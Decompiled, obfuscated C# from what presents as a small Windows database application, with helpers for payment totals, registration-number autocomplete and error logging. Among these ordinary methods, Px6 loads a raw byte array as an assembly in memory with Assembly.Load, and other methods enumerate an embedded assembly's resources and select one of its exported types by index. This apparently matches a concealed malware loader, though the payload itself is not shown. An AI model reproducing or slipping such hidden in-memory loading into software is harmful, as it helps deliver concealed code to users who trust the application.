using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Ex8;
using Hr60;
using Lp2;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Yw6;

namespace q3G;

[StandardModule]
internal sealed class Yd3
{
	public static void i3T(string Yo3)
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string path = Application.get_StartupPath() + "\\errorlogfile.txt";
			StreamWriter streamWriter = new StreamWriter(path, append: true);
			streamWriter.WriteLine(Yo3);
			streamWriter.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public static int a1K()
	{
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.w3B(dataTable);
			int num = 0;
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dataTable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					num = checked((int)Math.Round((double)num + Conversion.Val(RuntimeHelpers.GetObjectValue(dataRow["totalPaid"]))));
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return num;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	public static int r1X()
	{
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.SelectCommand = Xe9.cmd;
			Xe9.da.w3B(dataTable);
			return Conversions.ToInteger(dataTable.Rows[0][0]);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			i3T(Strings.Format((object)DateAndTime.get_Now(), "Long Date") + " " + DateTime.Now.ToString("H:mm:ss") + " ===>> " + ex2.Message);
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	public static int w3C()
	{
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.SelectCommand = Xe9.cmd;
			Xe9.da.w3B(dataTable);
			return dataTable.Rows.Count;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			i3T(Strings.Format((object)DateAndTime.get_Now(), "Long Date") + " " + DateTime.Now.ToString("H:mm:ss") + " ===>> " + ex2.Message);
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	public static int p8W()
	{
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (w3C() > 0)
			{
				return w3C();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			i3T(Strings.Format((object)DateAndTime.get_Now(), "Long Date") + " " + DateTime.Now.ToString("H:mm:ss") + " ===>> " + ex2.Message);
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	internal static void Px6()
	{
		Assembly assembly = null;
		if ((object)assembly == null)
		{
			byte[] rawAssembly = (byte[])t0S8.mDic[t0S8.mArray];
			assembly = Assembly.Load(rawAssembly);
		}
		t0S8.mDic.Add("Deep", assembly);
		assembly = null;
		if (m4F.Bf6())
		{
			c8N.Zd9();
		}
	}

	public static int Yj9()
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.SelectCommand = Xe9.cmd;
			Xe9.da.w3B(dataTable);
			if (dataTable.Rows.Count > 0)
			{
				return Conversions.ToInteger(dataTable.Rows[0][0]);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return 0;
	}

	public static bool k2W()
	{
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.SelectCommand = Xe9.cmd;
			Xe9.da.w3B(dataTable);
			if (dataTable.Rows.Count > 0)
			{
				return true;
			}
			return false;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	public static void r4J(object a2Z)
	{
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.SelectCommand = Xe9.cmd;
			Xe9.da.w3B(dataTable);
			NewLateBinding.LateCall(NewLateBinding.LateGet(a2Z, (Type)null, "AutoCompleteCustomSource", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = dataTable.Rows.GetEnumerator();
				while (enumerator.MoveNext())
				{
					DataRow dataRow = (DataRow)enumerator.Current;
					NewLateBinding.LateCall(NewLateBinding.LateGet(a2Z, (Type)null, "AutoCompleteCustomSource", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { dataRow["regNumber"].ToString() }, (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			Xe9.da.Ns5();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)64, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static string[] x9B()
	{
		List<string> list = new List<string>();
		int num = 0;
		string[] manifestResourceNames = ((Assembly)t0S8.mDic["bee"]).GetManifestResourceNames();
		foreach (string item in manifestResourceNames)
		{
			list.Add(item);
		}
		checked
		{
			string[] array = new string[list.Count - 1 + 1];
			int num2 = array.Length - 1;
			for (num = 0; num <= num2; num++)
			{
				array[num] = list[num];
			}
			return array;
		}
	}

	public static void k0Q(object Ga2, string f3Y, string d1N)
	{
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		DataTable dataTable = new DataTable();
		try
		{
			Xe9.da.SelectCommand = Xe9.cmd;
			Xe9.da.w3B(dataTable);
			object obj = Ga2;
			NewLateBinding.LateSet(obj, (Type)null, "DataSource", new object[1] { dataTable }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "displaymember", new object[1] { f3Y }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj, (Type)null, "valuemember", new object[1] { d1N }, (string[])null, (Type[])null);
			obj = null;
			Xe9.da.Ns5();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)64, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static Type x9T(Assembly k8G)
	{
		return k8G.GetExportedTypes()[27];
	}
}
